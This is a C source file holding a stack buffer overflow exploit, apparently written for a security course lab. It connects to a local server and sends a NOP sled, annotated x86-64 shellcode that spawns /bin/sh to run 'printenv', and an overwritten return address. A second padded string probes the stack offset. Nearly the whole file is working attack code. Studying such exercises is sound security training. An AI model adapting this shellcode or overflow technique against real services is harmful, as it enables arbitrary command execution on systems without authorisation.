#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

//+
// Function: main
//
// Purpose: Entry point of the program. It validates the port number and initiates an attack on the specified port.
//
// Parameters: argc (int) - Count of command-line arguments.
//             argv (char*[]) - Array of command-line arguments.
//
// Returns: None. Ends the program after executing the attack.
//-

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

//+
// Function: DoAttack
//
// Purpose: Establishes a connection to the server on the specified port and performs the attack.
//
// Parameters: portNo (int) - The port number to connect to.
//
// Returns: None. Terminates the program if it encounters an error.
//-

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

//+
// Variable: compromise
//
// Purpose: Contains the shellcode and NOP sled used in the attack.
//
// Details: This array includes a series of NOPs followed by shellcode and the modified return address.
//
//-

char compromise[224]={
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
0x90,0x90,0x90,0x90,0x90,0x90,
0xEB, 0x52,                             //start:     jmp short codeEnd
0x5E,                                   //start2:    pop rsi ; rsi holds exeStr address
0x48, 0x31, 0xC0,                       //xor rax, rax
0x88, 0x46, 0x07,                       //mov [rsi+flagStr-exeStr-2],al
0x88, 0x46, 0x0B,                       //mov [rsi+cmdStr-exeStr-1],al
0x88, 0x46, 0x19,                       //mov [rsi+arrayAddr-exeStr-1],al
0x48, 0x89, 0x46, 0x32,                 //mov [rsi+arrayAddr-exeStr+24],rax
0x48, 0x89, 0x76, 0x1A,                 //mov [rsi + arrayAddr - exeStr], rsi
0x48, 0x8D, 0x7E, 0x09,                 //lea rdi, [byte rsi+flagStr-exeStr]
0x48, 0x89, 0x7E, 0x22,                 //mov [rsi + arrayAddr - exeStr +8] , rdi
0x48, 0x8D, 0x7E, 0x0C,                 //lea rdi, [byte rsi+cmdStr-exeStr]
0x48, 0x89, 0x7E, 0x2A,                 //mov [rsi + arrayAddr - exeStr +16] , rdi
0xB0, 0x3B,                             //mov al,0x3b
0x48, 0x89, 0xF7,                       //mov rdi,rsi
0x48, 0x8D, 0x76, 0x1A,                 //lea rsi, [rsi + arrayAddr - exeStr]
0x48, 0x89, 0xE2,                       //mov rdx, rsp
0x48, 0xC1, 0xEA, 0x20,                 //shr rdx, 32
0x48, 0xC1, 0xE2, 0x20,                 //shl rdx, 32
0xB9, 0xFF, 0xE6, 0xFB, 0xF7,           //mov ecx, 0xf7fbe6ff
0x30, 0xC9,                             //xor cl, cl
0x48, 0x09, 0xCA,                       //or  rdx, rcx
0x48, 0x8B, 0x12,                       //mov rdx, [rdx]
0x0F, 0x05,                             //syscall
0x48, 0x89, 0xC7,                       //mov rdi,rax
0x48, 0x31, 0xC0,                       //xor rax, rax
0xB0, 0x3C,                             //mov al, 0x3c
0x0F, 0x05,                             //syscall  
0xE8, 0xA9, 0xFF, 0xFF, 0xFF,           //codeEnd:   call start2
0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,                //exeStr:    db "/bin/shXy"
0x2D, 0x63, 0x58,                                                    //flagStr:   db "-cX"
0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B,                //cmdStr:    db "printenv;exitX"
0x65, 0x78, 0x69, 0x74, 0x58, 
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //arrayAddr: dq 0xffffffffffffffff
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff
0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                   //dq 0xffffffffffffffff

0xb0,0xde,0xff,0xff,
0xff,0x7f,0x0A,0x00,    //newAddr:   dd newAddr-start

};

//+
// Variable: compromise1
//
// Purpose: Used to test and probe the stack for correct values and offsets for the exploit.
//
// Details: A string filled with 'x' characters and a marker used to determine the correct buffer size and offset.
//
//-

char * compromise1=
    "xxxxxxxxxxxxxxxxxxxx" 
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxxx\n";

//+
// Function: Attack
//
// Purpose: Sends the exploit code to the server.
//
// Parameters: outfile (FILE *) - File stream associated with the server connection.
//
// Returns: None. Writes the exploit code to the server.
//-

void Attack(FILE * outfile){
    fprintf(outfile, "%s", compromise);  
    fflush(outfile);
}